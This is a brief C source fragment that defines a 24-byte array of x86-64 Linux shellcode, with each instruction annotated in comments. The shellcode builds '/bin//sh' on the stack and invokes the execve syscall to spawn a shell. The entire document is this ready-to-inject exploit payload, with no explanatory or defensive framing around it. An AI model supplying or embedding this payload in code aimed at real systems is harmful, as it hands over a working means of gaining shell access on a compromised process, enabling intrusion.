
#define SH_SIZE 24

char SH[] = {
  /* 0000 */ "\x6a\x3b"                                 /* push 0x3b                   */
  /* 0002 */ "\x58"                                     /* pop rax                     */
  /* 0003 */ "\x99"                                     /* cdq                         */
  /* 0004 */ "\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68" /* mov rbx, 0x68732f2f6e69622f */
  /* 000E */ "\x52"                                     /* push rdx                    */
  /* 000F */ "\x53"                                     /* push rbx                    */
  /* 0010 */ "\x54"                                     /* push rsp                    */
  /* 0011 */ "\x5f"                                     /* pop rdi                     */
  /* 0012 */ "\x52"                                     /* push rdx                    */
  /* 0013 */ "\x57"                                     /* push rdi                    */
  /* 0014 */ "\x54"                                     /* push rsp                    */
  /* 0015 */ "\x5e"                                     /* pop rsi                     */
  /* 0016 */ "\x0f\x05"                                 /* syscall                     */
};